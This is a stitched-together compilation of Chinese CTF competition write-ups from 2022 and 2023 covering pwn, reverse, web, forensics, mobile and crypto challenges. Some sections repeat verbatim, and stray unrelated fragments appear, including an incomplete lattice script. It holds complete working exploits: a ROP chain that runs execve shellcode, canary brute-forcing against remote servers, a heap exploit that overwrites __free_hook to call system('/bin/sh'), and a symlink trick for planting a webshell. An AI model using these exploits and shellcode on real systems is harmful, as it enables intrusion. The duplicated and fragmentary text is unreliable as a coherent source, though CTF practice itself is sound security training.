heap=u64(p.recvline().replace(b'\n',b'')+b'\0\0')-0x260
success('heap:'+hex(heap))
edit(1,p64(heap+0x10))
add(0x68)#2
add(0x68)#3
add(0x7f)#4
add(0x28)#5
edit(3,b'\x00'*7+b'\x07')
free(4)
show(4)
libc_addr=u64(p.recvuntil(b'\x7f')[-6:]+b'\0\0')-96-0x10-
libc.sym['__malloc_hook']
success('libc:'+hex(libc_addr))
edit(3,b'a'*0x48+p64(libc_addr+libc.sym['__free_hook']))
add(0x28)#6
edit(6,p64(libc_addr+libc.sym['system']))
edit(0,'/bin/sh\0')
free(0)
gdb.attach(p)
p.interactive(
```

> 这周虚拟机崩了，之前写的脚本也就丢失了，所以就直接拿了别的师傅的exp，和我的攻击思路应该大差不差。



# RE

## ManyCheck

第一个检查是猜幸运数字，把程序拖进ida，通过字符串查询“First check”就可以立马定位到如下图所示的函数，然后易得出那个要猜的数字就是`77`

![image-20220920204556151](2022浙江省ctf初赛/image-20220920204556151.png)

第二个检查根据问题敲敲计算器就可以计算出`55`和`49`两个答案，程序中的判断如下图所示

![image-20220920204745404](2022浙江省ctf初赛/image-20220920204745404.png)

第三个检查依旧可以利用字符串查找来定位到关键函数，可看到下图中的11行就是判断

![image-20220920204900834](2022浙江省ctf初赛/image-20220920204900834.png)

最后可以看到如下图所示的运算

![image-20220920205002693](2022浙江省ctf初赛/image-20220920205002693.png)

是循环移位，直接用python跑

```python
>>> x=1718896489
>>> (x>>16)+((x&(2**16-1))<<16)
1198089844
```

复制翻转修复好的16进制码，在winhex中还原出新的压缩包

发现缺少png文件头，89504E47给它补上

Post.title: 2022蓝帽杯初赛WP
Post._content:
# misc_domainhacker

下载附件，发现是流量分析题，用wireshark打开

![图片](/clip_image002-16573700049682.gif)

在这里找到了rar文件，导出后发现需要密码，于是继续探索

在tcp追踪流13发现了有用信息

![图片](/clip_image004.gif)

阅读拼接进行base64解密试试

![图片](/clip_image006.gif)

发现了密码，解压压缩包

![图片](/clip_image008.gif)

发现是mimikatz工具的界面，于是在NTLM这里找到了hash值

![图片](/clip_image010.gif)



# 手机取证_1

用盘古石阅读器打开，搜索题目给出的图片的名字

![图片](/clip_image002-16573700345378.gif)

 

导出该图片，并查看该图片属性的详细信息，得到分辨率360x360

![图片](/clip_image004-16573700345389.gif)



# 手机取证_2

题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总

![图片](/clip_image002-165737006076812.gif)

 

果然，在群组聊天中找到了快递单号



# 计算机取证_1

读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：./volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 hashdump

![图片](/clip_image002-165737008500914.gif)

找到了，发现是md5加密过的，md5解密

![图片](/clip_image004-165737008501015.gif)得到开机密码anxinqi

  

# 计算机取证_2

看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：./volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 pstree

![图片](/clip_image002-165737010442218.gif)

看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu

![图片](/clip_image004-165737010442219.gif)

看到这里便可以放心提交答案了，查看下pid是2192



# 计算机取证_3

看题发现这个是磁盘性质的取证题了，于是用取证大师

![图片](/clip_image002.jpg)

 

导出了三个文件，其中就有ppt

word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word

![图片](/clip_image004-165737014552022.gif)

文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破

![图片](/clip_image006-165737014552023.gif)

得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag

![图片](/clip_image008-165737014552024.gif)



# 计算机取证_4

在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥

根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析

![图片](/clip_image002-165737018007529.gif)

导出keyfile

![图片](/clip_image004-165737018007531.gif)

新建案例，开始取证

![图片](/clip_image006-165737018007530.gif)

发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314

![图片](/clip_image008-165737018007532.gif)

打开压缩包，得到flag

![图片](/clip_image010-165737018007533.gif)

flag{1349934913913991394cacacacacacc}



# 程序分析_1

 将文件下载下来，然后将后缀改为".zip"，拖入winrar中将配置文件AndroidManifest.xml解压出来。

然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示

![image-20220709190538890](/image-20220709190538890.png)

所以flag为“exec.azj.kny.d.c”。



# 程序分析_2

上题反编译出来的配置文件中有如下图所示内容

![image-20220709190735776](/image-20220709190735776.png)

“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序

所以flag为"minmtta.hemjcbm.ahibyws.MainActivity".



# 程序分析_3

将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容

![image-20220709191141536](/image-20220709191141536.png)

根据代码大致就可以猜测base64解密的内容就是密文。

所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”



# 程序分析_4

在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面

根据关键词查找发现如下内容

![image-20220709191504565](/image-20220709191504565.png)

这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段

![image-20220709191701294](/image-20220709191701294.png)

qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。

所以flag为“a”



# 网站取证_1

题目提示有后门

![图片](/clip_image002.gif)

d盾扫描获得flag

 

# 网站取证_2

查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag

![image-20220709202049506](/image-20220709202049506.png)



# 网站取证_3

在Channelorder.php和Channelorderlist.php中都有盐值即$key

![image-20220709202224818](/image-20220709202224818.png)

Post.title: 2023CISCN初赛
Post._content:
# 一、战队信息

战队名称：R3ape1

战队排名：171

# 二、解题情况

![image-20230605212532028](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052125141.png)

# 三、解题过程

## MISC

 

### 签到卡

![image-20230605212550137](C:\Users\16956\AppData\Roaming\Typora\typora-user-images\image-20230605212550137.png)

根据提示可以知道穿孔卡片机里面执行的是python脚本，那就直接用python语句来读取flag就行

print(open('/flag').read())

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif)

得到flag，**flag{3b78ec89-8a1c-424d-a9eb-97d63648846e}**

 

### 被加密的生产流量

打开流量包发现是modbus协议，还查找了许多资料，但其实flag直接追踪tcp流就可

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052128383.gif)

在0流获取base32编码拼接，解码得到flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052128388.gif)

**flag{c1f_fi1g_1000}**

 

### 国粹

附件得到三张图片

其中题目.png作为每一块麻将所代表的数字，按顺序标记一下

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129430.gif)

a.png和k.png分别作为横纵坐标，用python脚本打点画一个坐标图

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129432.gif)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129439.gif)

### ezbyte

**参考文章**[http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https://richar.top/nothingchu-ti-si-lu-ji-wp/](http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https:/richar.top/nothingchu-ti-si-lu-ji-wp/)

**根据题目可知这道题大概是考察DWARF字节码，readelf -Wwf 可以查看DWARF字节码**

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif)

字节码很长但是我们只要看其中的r12表达式

先看ida

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image050.gif)

首先要进入到yes需要r13与r12相等，而xor r13，r13把r13清零了，所以只要r12等于0就行了

再根据之前的字节码分析得出

`((a3 + 1512312) ^ 0x2D393663614447B1)+ ((a1 + 1892739) ^ 0x35626665394D17E8)+ ((a2 + 8971237) ^ 0x65342D6530C04912) + ((a4 + 9123704) ^ 0x6336396431BE9AD9)=0`成立就行

写出exp

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image054.gif)

## pwn

### 烧烤摊儿

购买啤酒功能没有对数量进行负数检查，所以可以用负数来绕过，从而进入gaming函数。gaming函数存在栈溢出，而且程序是静态链接，所以调用mprotect修改内存上的可执行权限，然后写shellcode并执行，从而getshell。

**EXP**：

```python
from pwn import *
#from LibcSearcher import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.106.71.184',34447)
elf = ELF("./pwn")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

sl(str(1))
sl(str(1))
sl(str(-200000))
sl(str(4))
sl(str(5))
pop_rdi = 0x40264f
pop_rsi = 0x40a67e
pop_rdx_rbx = 0x4a404b
mprotect = 0x458B00
read=0x457DC0
payload=b'a'*0x28+p64(pop_rdi)+p64(0x4eA000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx_rbx)+p64(7)+p64(0)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(0x4eA000)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(read)+p64(0x4eA000)
sl(payload)
sl(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
interactive()
```



 

### funcanary

有fork函数和栈溢出，所以直接爆破canary，虽然给了后门，但开了PIE，所以爆破后门地址最低二字节。

**EXP**：

```python
from pwn import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.106.48.123',21251)
elf = ELF("./pwn")
#libc = ELF("./")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

canary = b'\x00'
while len(canary) < 8:
  for i in range(1,255):
    ru(b'welcome\n')
    payload = b'a'*0x68 + canary + p8(i)
    sd(payload)
    text = io.recvline()
    if b'stack smashing' not in text:
        canary += p8(i)  
        break

printf(uu64(canary))
payload = b'a'*0x68 + canary + p64(0) + p16(0x5228)
sda(b'welcome\n', payload) 
interactive()
```



 

## web

### unzip

随便上传一个文件，看到返回了如下代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
  exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
```



我们看到这里判断了上传文件类型application/zip为zip文件，之后执行了exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);到tmp但是我们无法直接访问呢，所以我们通过制作软路由来绕过/tmp链接到/var/www/html然后把shell写进去即可；

上传压缩包压缩包内容如下

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129226.gif)

这题需要用拼接字符的方法去形成python语句来进行命令执行，而且一行有七个字符的限制

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129231.gif)

拼接语句并执行

得到flag，**flag{6e363201-df3c-4957-9842-e0f79740a8df}**

填写问卷得到flag

## Crypto 

### 基于国密SM2算法的密钥密文分发

跟着题目给的文档进行复现

首先先在线网站生成自己的private_keyA和public_keyA

https://const.net.cn/tool/sm2/genkey/

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130855.gif)

再将个人信息发送到/api/login获取选手id（汉字需要进行url编码）

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130860.jpg)

再用获取到的id和刚才生成的public_keyA发送到/api/allkey获取public_keyB和private_keyB

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130868.jpg)

在/api/quantum获取quantumString

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130859.jpg)

接着以为就是要进行sm2和sm4解密了，但可以直接/api/search获取解密之后的quantumString

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130867.jpg)

再用该string进行check

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130869.jpg)

接着再次search就可以获得flag了

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130210.jpg)

**flag{3e619f88-5b3c-4be2-8c9a-94067afa2a5e}**

## Reverse

### ezbyte

**参考文章**[http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https://richar.top/nothingchu-ti-si-lu-ji-wp/](http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https:/richar.top/nothingchu-ti-si-lu-ji-wp/)

**根据题目可知这道题大概是考察DWARF字节码，readelf -Wwf 可以查看DWARF字节码**

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif)

字节码很长但是我们只要看其中的r12表达式

先看ida

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image050.gif)

首先要进入到yes需要r13与r12相等，而xor r13，r13把r13清零了，所以只要r12等于0就行了

再根据之前的字节码分析得出

`((a3 + 1512312) ^ 0x2D393663614447B1)+ ((a1 + 1892739) ^ 0x35626665394D17E8)+ ((a2 + 8971237) ^ 0x65342D6530C04912) + ((a4 + 9123704) ^ 0x6336396431BE9AD9)=0`成立就行

写出exp

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image052.gif)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image054.gif)

在拼接上上面的字符

**flag{e609efb5-e70e-4e94-ac69-ac31d96c3861}**

 

### babyRE

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image056.gif)

看见这个flag，估计是假的，后面有串list，发现第一个是102就是字符“f“，可是第二个10并不是字符”l“，尝试把102^10，发现就是字符”l“，所以就是list[i]^list[i+1],解出来就是上面的假flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image058.jpg)

第一行发现是一种Snap的语言，进入官网运行这个文件

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image060.gif)

发现flag的逻辑

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image062.gif)

根据代码分析

exp

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image064.gif)

 

## pwn

### 烧烤摊儿

购买啤酒功能没有对数量进行负数检查，所以可以用负数来绕过，从而进入gaming函数。gaming函数存在栈溢出，而且程序是静态链接，所以调用mprotect修改内存上的可执行权限，然后写shellcode并执行，从而getshell。

**EXP**：

```python
from pwn import *
#from LibcSearcher import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.106.71.184',34447)
elf = ELF("./pwn")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

sl(str(1))
sl(str(1))
sl(str(-200000))
sl(str(4))
sl(str(5))
pop_rdi = 0x40264f
pop_rsi = 0x40a67e
pop_rdx_rbx = 0x4a404b
mprotect = 0x458B00
read=0x457DC0
payload=b'a'*0x28+p64(pop_rdi)+p64(0x4eA000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx_rbx)+p64(7)+p64(0)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(0x4eA000)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(read)+p64(0x4eA000)
sl(payload)
sl(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
interactive()
```



 

### funcanary

有fork函数和栈溢出，所以直接爆破canary，虽然给了后门，但开了PIE，所以爆破后门地址最低二字节。

**EXP**：

```python
from pwn import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.106.48.123',21251)
elf = ELF("./pwn")
#libc = ELF("./")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

canary = b'\x00'
while len(canary) < 8:
  for i in range(1,255):
    ru(b'welcome\n')
    payload = b'a'*0x68 + canary + p8(i)
    sd(payload)
    text = io.recvline()
    if b'stack smashing' not in text:
        canary += p8(i)  
        break

printf(uu64(canary))
payload = b'a'*0x68 + canary + p64(0) + p16(0x5228)
sda(b'welcome\n', payload) 
interactive()
```



 

## web

### unzip

随便上传一个文件，看到返回了如下代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
  exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
```



我们看到这里判断了上传文件类型application/zip为zip文件，之后执行了exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);到tmp但是我们无法直接访问呢，所以我们通过制作软路由来绕过/tmp链接到/var/www/html然后把shell写进去即可；

# Mobile

## Level_One

找到![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image038.jpg)

换表base

在strings.xml资源里找到enc和table

```python
import string

 

 

def base64_decode(ciphertext, table):

  padding_char = table[-1]

  table = table[:-1] + '='

  table_dict = {table[i]: i for i in range(len(table))}

  table_dict[padding_char] = None

 

  result = []

  buffer = 0

  count = 0

 

  for char in ciphertext:

​    if char not in table_dict:

​      continue

​    val = table_dict[char]

​    if val is None:

​      continue

​    buffer <<= 6

​    buffer |= val

​    count += 1

​    if count == 4:

​      result.append((buffer & 0xFF0000) >> 16)

​      result.append((buffer & 0xFF00) >> 8)

​      result.append(buffer & 0xFF)

​      buffer = 0

​      count = 0

 

  if count == 2:

​    buffer >>= 4

​    result.append(buffer & 0xFF)

  elif count == 3:

​    buffer >>= 2

​    result.append((buffer & 0xFF00) >> 8)

​    result.append(buffer & 0xFF)

 

  return bytes(result).decode('utf-8')

 

 

ciphertext = 'UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5'

table = 'n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ<'

 

plaintext = base64_decode(ciphertext, table)

print(plaintext)

得到flag
```

**flag{380605c6-7123-4f71-b573-601e8c4457b4}**

 

## Level_Up

把so提出来放ida

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.gif)

利用findcrypt插件找base64密文

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.gif)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif)

在这里看到了这一串，跟进去

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.jpg)

key为followyourheart!

密文为：

"gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc"

解密脚本：

```python
import base64

from Crypto.Cipher import AES

 

def decrypt_data(ciphertext, key):

  \# 将Base64编码的数据解码为字节串

  ciphertext = base64.b64decode(ciphertext)

  \# 创建一个AES密码对象

  cipher = AES.new(key.encode(), AES.MODE_ECB)

  \# 解密数据并去除填充部分

  plaintext = cipher.decrypt(ciphertext).rstrip(b'\0')

  \# 返回解密后的数据

  return plaintext.decode()

 

ciphertext = "gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc"

key = "followyourheart!"

plaintext = decrypt_data(ciphertext, key)

print(plaintext)
```





得到flag，**flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}**

# PWN

伪随机数，覆盖种子为0，然后动调出密文，最后打ret2dlresolve

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055747.jpg)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052055778.gif)

**EXP:**

```python
from pwn import *
#from LibcSearcher import *
#io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.104.19.209',16519)
elf = ELF("./pwn")
libc = ELF("./libc-2.27.so")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
```

```javascript
function copyArray(arr1){
    var arr2 = new Array(arr1.length);
    for (var i=0;i<arr1.length;i++){
        if(arr1[i] instanceof Object){
            arr2[i] = copyArray(arr1[i])
        }else{
            arr2[i] = arr1[i]
        }
    }
    return arr2
}

app.post('/vm2_tester',function(req,res){

        const properties = req.body.properties
        for (let i = 0; i < properties.length; i++) {
            if (properties[i] == 'vm2_tester') {
                res.send('cant set vm2_tester by self')
                return
            }
        }
        req.session.user.properties = copyArray(properties)
        res.send('Success')

        res.send("input username")
    }
})


app.post('/vm2',function  (req, res) {

    if(req.session.user && req.session.user.properties) {
        for (var i = 0; i < req.session.user.properties.length; i++)
            if (req.session.user.properties[i] == 'vm2_tester') {
                if (req.body["code"]) {
                    if (/\b(?:function)\b/.test(req.body["code"])) {
                        res.send("define function not allowed")
                        return;
                    }
                    if (/\b(?:getPrototypeOf)\b/.test(req.body["code"])) {
                        res.send("define getPrototypeOf not allowed")
                        return;
                    }
                    const vm = new VM();
                    res.send(vm.run(req.body["code"]))
                    return
                } else{
                    res.send("input code")
                }
            }
    }else{
        res.send("not vm2 tester rights")
    }

})


app.get('/', function (req, res) {

});
app.get('/src', function (req, res) {
    var data = fs.readFileSync('app.js');
    res.send(data.toString());
});

app.listen(3000, function () {
    console.log('start listening on port 3000');
});
```

```python
from Crypto.Cipher import ARC4
import hashlib

a = [0xA2, 0x05, 0x05, 0xDB, 0x23, 0x11, 0x0E, 0x39, 0x46, 0x06, 0x0C, 0xD1, 0x91, 0xC6, 0x44, 0xE2, 0x1A, 0x9C, 0x61, 0xF1, 0xD3, 0xEB, 0x75, 0x3A, 0x81, 0x5D, 0xA2, 0x12, 0xB4, 0x58, 0x2A, 0xDB, 0x94, 0x14]

def rc4(mi, key):
  s = list(range(256))
  j = 0
  for i in range(256):
    j = (j + s[i] + key[i % 32]) % 256
    s[i], s[j] = s[j], s[i]
  i = j = 0
  for w in range(len(mi)):
    i = (i + 1) % 256
    j = (j + s[i]) % 256
    s[i], s[j] = s[j], s[i]
    t = (s[i] + s[j]) % 256
    mi[w] ^= s[t]
  return mi

for i in range(0x10000):
  pwd1 = hex(i)[2:]
  h1 = hashlib.sha256(pwd1.encode('utf-8')).hexdigest()
  h1_list = bytes.fromhex(h1)
  key = list(h1_list)
  mi = a.copy()
  mi = rc4(mi, key)
  Str = ''.join(chr(x) for x in mi)
  if Str.startswith('flag{'):
print(Str)
```

# Crypto

## RSA_like

标准NovelSystem的加密函数

```python
from gmpy2 import *
#NovelSystem 加密算法
class NovelSystem:
    def __init__(self, p, q, e):
        self.p = mpz(p)
        self.q = mpz(q)
        self.N = self.p * self.q
        self.beta = 0.397
        self.psi = (self.p ** 2 + self.p + 1) * (self.q ** 2 + self.q + 1)
        self.e = mpz(e)
        self.d = invert(mpz(self.e), mpz(self.psi))
        self.r = 3
        
    def add_(self, a, b):
        m, n = a
        k, l = b
        if a[1] == 0:
            a, b = b, a
            m, n, k, l = k, l, m, n
        if l == 0:
            if n == 0:
                return (m * k, m + k)
            if (n + k) % self.N == 0:
                if (m - n ** 2) % self.N == 0:
                    return (0, 0)
                return ((m * k + self.r) * invert(m - n * n) % self.N, 0)
            return ((m * k + self.r) * invert(n + k, self.N) % self.N, (m + n * k) * invert(n + k, self.N) % self.N)
        if (m + k + n * l) % self.N != 0:
            return ((m * k + (n + l) * self.r) * invert(m + k + n * l, self.N) % self.N,
                    (n * k + m * l + self.r) * invert(m + k + n * l, self.N) % self.N)
        
        if (n * k + m * l + self.r) % self.N == 0:
            return (0, 0)
        return ((m * k + (n + l) * self.r) * invert(n * k + m * l + self.r, self.N) % self.N, 0)
    
    def mul_(self, a, n):
        ans = (0, 0)
        while n > 0:
            if n & 1 == 1:
                ans = self.add_(ans, a)
            a = self.add_(a, a)
            n //= 2
        return ans
    def encrypt(self, m):
        return self.mul_(m, self.e)
    def decrypt(self, c):
        return self.mul_(c, self.d)
```

先分解n

脚本如下：

```python
#---------------------------
'''
1,素数结构 p = a^2 + 3* b^2 ,p%3 == 1
2,phi的结构phi = (p^2+p+1)*(q^2+q+1)
3,给出N,e,c 
论文:https://eprint.iacr.org/2021/1160.pdf 
'''
import time
 
############################################
# Config
##########################################
 
"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = True
 
"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct 
upperbound on the determinant. Note that this 
doesn't necesseraly mean that no solutions 
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False
 
"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7 # stop removing if lattice reaches that dimension
 
############################################
# Functions
##########################################
 
# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1
   print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")
 
# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)
 
# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB
 
    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
